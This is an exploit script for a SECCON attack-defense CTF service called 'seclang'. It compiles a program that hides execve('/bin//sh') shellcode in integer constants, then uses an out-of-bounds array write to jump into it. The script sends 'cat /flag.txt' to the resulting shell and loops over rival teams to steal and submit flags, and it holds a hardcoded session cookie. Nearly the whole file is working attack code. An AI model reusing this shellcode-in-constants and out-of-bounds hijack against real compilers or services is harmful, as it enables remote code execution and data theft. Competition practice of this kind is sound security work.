import requests
import time
s = requests.Session()

s.cookies.set("session", "eyJ0ZWFtaWQiOjF9.Y-cS9g.-P8ESI0TijClMm_mXnrDXwEfMAI")

while True:
    for team in range(2,13):
        while True:
            res = s.post("http://seclang.dom.seccon.games/api/compile", json={"code": "func kudos() {\n  a = 0x15eb909090db3148;\n  a = 0x15eb909090c03148;\n  a = 0x15eb9068732f6eb8;\n  a = 0x15eb909020e0c148;\n  a = 0x15eb69622f2f0548;\n  a = 0x15eb909090909053;\n  a = 0x15eb909090909050;\n  a = 0x15eb909090e18948;\n  a = 0x15eb909090909053;\n  a = 0x15eb909090909051;\n  a = 0x15eb909090e68948;\n  a = 0x15eb909090cf8948;\n  a = 0x15eb909090d23148;\n  a = 0x15eb900000003bb8;\n  a = 0x15eb90909090050f;\n  return 0;\n}\n\n\nfunc main() {\n  arr = [1];\n  arr[0] = 1;\n  arr[0x5] = kudos+12;\n  return 0;\n}", "target": team}).json()
            time.sleep(2)
            if "ticket" in res:
                break
        ticket = res["ticket"]
        print(res)
        # {"status":"ok","ticket":"a4b8f258c527295366ad884ddc1fbb89"}
        while True:
            time.sleep(5)
            res = s.post(f"http://seclang.dom.seccon.games/api/execute/{ticket}",
                json={"input": "636174202f666c61672e747874"}).json()
            print(res)
            if "label" in res:
                break
        label = res["label"]
        # {"label":"c1290d1d1a3713d5eb3363eab49647af","status":"ok"}
        while True:
            res = s.get(f"http://seclang.dom.seccon.games/api/execute/{label}").json()
            print(res)
            time.sleep(2)
            if res["status"] != "wait":
                break
        output = res["response"]["output"]
        # {"response":{"input":"636174202f666c61672e747874","output":"534543434f4e7b546f6b796f5765737465726e735f39363866333031653135316537306337616437363133306161623034346462347d","result":"ok"},"status":"ok"}

        # >>> bytes.fromhex("534543434f4e7b546f6b796f5765737465726e735f39363866333031653135316537306337616437363133306161623034346462347d")
        # b'SECCON{TokyoWesterns_968f301e151e70c7ad76130aab044db4}'
        flag = bytes.fromhex(output).decode('utf-8')
        print(flag)
        print(s.post("http://seclang.dom.seccon.games/api/submit", json={"flag": flag}).text)
        time.sleep(10)
    time.sleep(10*60)
